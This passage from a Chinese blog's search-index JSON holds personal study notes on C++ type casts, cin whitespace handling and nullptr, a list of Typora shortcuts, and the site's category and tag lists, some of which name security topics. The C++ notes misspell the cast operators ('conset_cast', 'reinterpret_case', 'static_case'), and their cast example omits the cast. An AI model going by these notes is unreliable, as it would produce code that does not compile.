传统的强制类型转换：把需要的指针类型放在一对圆括号之间，然后写出将被强制转换的地址值 Company *company = new Company(“APPLE”，“Iphone”); TechCompany *techCompany = company； 注意：不能既删除company，又删除tecCompany。因为强制类型转换操作不会创建一个副本拷贝，它只告诉编译器把有关变量解释为另一种类型组合形式，所以他们指向的是同一个地址 万一被强制转换的类型和目标类型结构完全不同，怎么办？ 强制类型转换操作符 conset_cast&lt;MyClass*&gt;(value) 用来改变value的“常量性” dynamic_cast&lt;MyClass*&gt;(value) 用来把一种类型的对象指针安全地强制转换为另一种类型的对象指针。注意：如果value的类型不是一个MyClass类（或MyClass的子类）的指针，这个操作将返回NULL reinterpret_case&lt;T&gt;(value) 在不进行任何实质性的转换的情况下，把一种类型的指针解释为另一种类型的指针或把一种整数解释为另一种整数 static_case&lt;T&gt;(value) 用来进行强制类型转换而不做任何运行时检查，老式强制类型转换操作的替代品 疑难杂症 用cin输入时如何让不跳过任意地方的空格和换行？ 操作符noskipws会令输入运算符读取空白符，而不是跳过它们。 cin&gt;&gt;noskipws;//设置cin读取空白符 cin&gt;&gt;skipws;//将cin恢复到默认状态，从而丢弃空白符 函数引用传参 &amp;a，a是实参，即传递过来的那个变量。该变 a 其变量也会变 数组 array[6]; swap(int &amp;a,int n); 当a是数组的第一个变量时，可以用*(&amp;a+1)来访问第二个变量 nullptr与NULL C++不允许void*隐式转换成其它类型的指针 #ifdef __cplusplus #define NULL 0 #else #define NULL ((void *)0) #endif 然而这样用NULL代替0表示空指针在函数重载时会出现问题 为解决NULL代指空指针存在的二义性问题，在C++11版本(2011年发布)中特意引入了nullptr这一新的关键字来代指空指针，使用nullptr作为实参。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.rgzzplus.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://www.rgzzplus.com/tags/C/"}]},{"title":"typora快捷键","slug":"typora快捷键","date":"2022-03-10T03:23:58.000Z","updated":"2022-03-20T15:15:14.403Z","comments":true,"path":"2022/03/10/typora快捷键/","link":"","permalink":"https://www.rgzzplus.com/2022/03/10/typora%E5%BF%AB%E6%8D%B7%E9%94%AE/","excerpt":"","text":"无序列表：输入-之后输入空格 有序列表：输入数字+“.”之后输入空格 任务列表：-[空格]空格 文字 标题：ctrl+数字 表格：ctrl+t 生成目录：[TOC]按回车 选中一整行：ctrl+l 选中单词：ctrl+d 选中相同格式的文字：ctrl+e 跳转到文章开头：ctrl+home 跳转到文章结尾：ctrl+end 搜索：ctrl+f 替换：ctrl+h 引用：输入&gt;之后输入空格 代码块：ctrl+alt+f 加粗：ctrl+b 倾斜：ctrl+i 下划线：ctrl+u 删除线：alt+shift+5 插入图片：直接拖动到指定位置即可或者ctrl+shift+i 插入链接：ctrl+k 最近我发现了一篇超强文章： Typora使用&amp;Markdown基础语法","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.rgzzplus.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"typora","slug":"typora","permalink":"https://www.rgzzplus.com/tags/typora/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://www.rgzzplus.com/categories/CTF/"},{"name":"转载","slug":"转载","permalink":"https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"},{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"},{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.rgzzplus.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"工具","slug":"工具","permalink":"https://www.rgzzplus.com/categories/%E5%B7%A5%E5%85%B7/"},{"name":"操作系统","slug":"操作系统","permalink":"https://www.rgzzplus.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"经验交流","slug":"经验交流","permalink":"https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"},{"name":"题库/作业","slug":"题库-作业","permalink":"https://www.rgzzplus.com/categories/%E9%A2%98%E5%BA%93-%E4%BD%9C%E4%B8%9A/"},{"name":"个人","slug":"个人","permalink":"https://www.rgzzplus.com/categories/%E4%B8%AA%E4%BA%BA/"}],"tags":[{"name":"整数安全","slug":"整数安全","permalink":"https://www.rgzzplus.com/tags/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://www.rgzzplus.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"},{"name":"格式化字符串","slug":"格式化字符串","permalink":"https://www.rgzzplus.com/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"shellcode","slug":"shellcode","permalink":"https://www.rgzzplus.com/tags/shellcode/"},{"name":"gdb","slug":"gdb","permalink":"https://www.rgzzplus.com/tags/gdb/"},{"name":"Linux汇编伪指令","slug":"Linux汇编伪指令","permalink":"https://www.rgzzplus.com/tags/Linux%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4/"},{"name":"漏洞","slug":"漏洞","permalink":"https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"Linux保护机制","slug":"Linux保护机制","permalink":"https://www.rgzzplus.com/tags/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"name":"HeapSpary","slug":"HeapSpary","permalink":"https://www.rgzzplus.com/tags/HeapSpary/"},{"name":"c","slug":"c","permalink":"https://www.rgzzplus.com/tags/c/"},{"name":"函数指针","slug":"函数指针","permalink":"https://www.rgzzplus.com/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/"},{"name":"pwn","slug":"pwn","permalink":"https://www.rgzzplus.com/tags/pwn/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://www.rgzzplus.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"reverse","slug":"reverse","permalink":"https://www.rgzzplus.com/tags/reverse/"},{"name":"LNMP","slug":"LNMP","permalink":"https://www.rgzzplus.com/tags/LNMP/"},{"name":"堆","slug":"堆","permalink":"https://www.rgzzplus.com/tags/%E5%A0%86/"},{"name":"SEHOP","slug":"SEHOP","permalink":"https://www.rgzzplus.com/tags/SEHOP/"},{"name":"ASLR","slug":"ASLR","permalink":"https://www.rgzzplus.com/tags/ASLR/"},{"name":"DEP","slug":"DEP","permalink":"https://www.rgzzplus.com/tags/DEP/"},{"name":"SafeSEH","slug":"SafeSEH","permalink":"https://www.rgzzplus.com/tags/SafeSEH/"},{"name":"栈","slug":"栈","permalink":"https://www.rgzzplus.com/tags/%E6%A0%88/"},{"name":"同步互斥","slug":"同步互斥","permalink":"https://www.rgzzplus.com/tags/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/"},{"name":"互斥锁","slug":"互斥锁","permalink":"https://www.rgzzplus.com/tags/%E4%BA%92%E6%96%A5%E9%94%81/"},{"name":"自旋锁","slug":"自旋锁","permalink":"https://www.rgzzplus.com/tags/%E8%87%AA%E6%97%8B%E9%94%81/"},{"name":"读写锁","slug":"读写锁","permalink":"https://www.rgzzplus.com/tags/%E8%AF%BB%E5%86%99%E9%94%81/"},{"name":"信号量","slug":"信号量","permalink":"https://www.rgzzplus.com/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/"},{"name":"条件变量","slug":"条件变量","permalink":"https://www.rgzzplus.com/tags/%E6%9D%A1%E4%BB%B6%E5%8F%98%E9%87%8F/"},{"name":"屏障","slug":"屏障","permalink":"https://www.rgzzplus.com/tags/%E5%B1%8F%E9%9A%9C/"},{"name":"GS","slug":"GS","permalink":"https://www.rgzzplus.com/tags/GS/"},{"name":"汇编指令","slug":"汇编指令","permalink":"https://www.rgzzplus.com/tags/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://www.rgzzplus.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"其它类型的漏洞","slug":"其它类型的漏洞","permalink":"https://www.rgzzplus.com/tags/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E/"},{"name":"内存攻击","slug":"内存攻击","permalink":"https://www.rgzzplus.com/tags/%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/"},{"name":"linux问题","slug":"linux问题","permalink":"https://www.rgzzplus.com/tags/linux%E9%97%AE%E9%A2%98/"},{"name":"linux命令行大全","slug":"linux命令行大全","permalink":"https://www.rgzzplus.com/tags/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%A7%E5%85%A8/"},{"name":"内存大小端","slug":"内存大小端","permalink":"https://www.rgzzplus.com/tags/%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%AB%AF/"},{"name":"ubuntu","slug":"ubuntu","permalink":"https://www.rgzzplus.com/tags/ubuntu/"},{"name":"C和指针","slug":"C和指针","permalink":"https://www.rgzzplus.com/tags/C%E5%92%8C%E6%8C%87%E9%92%88/"},{"name":"Git","slug":"Git","permalink":"https://www.rgzzplus.com/tags/Git/"},{"name":"ollydebug","slug":"ollydebug","permalink":"https://www.rgzzplus.com/tags/ollydebug/"},{"name":"task_struct","slug":"task-struct","permalink":"https://www.rgzzplus.com/tags/task-struct/"},{"name":"hexo","slug":"hexo","permalink":"https://www.rgzzplus.com/tags/hexo/"},{"name":"建站","slug":"建站","permalink":"https://www.rgzzplus.com/tags/%E5%BB%BA%E7%AB%99/"},{"name":"Linux常用命令","slug":"Linux常用命令","permalink":"https://www.rgzzplus.com/tags/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"name":"中国知网","slug":"中国知网","permalink":"https://www.rgzzplus.com/tags/%E4%B8%AD%E5%9B%BD%E7%9F%A5%E7%BD%91/"},{"name":"Linux","slug":"Linux","permalink":"https://www.rgzzplus.com/tags/Linux/"},{"name":"杂谈","slug":"杂谈","permalink":"https://www.rgzzplus.com/tags/%E6%9D%82%E8%B0%88/"},{"name":"心路","slug":"心路","permalink":"https://www.rgzzplus.com/tags/%E5%BF%83%E8%B7%AF/"},{"name":"C++","slug":"C","permalink":"https://www.rgzzplus.com/tags/C/"},{"name":"typora","slug":"typora","permalink":"https://www.rgzzplus.com/tags/typora/"}]}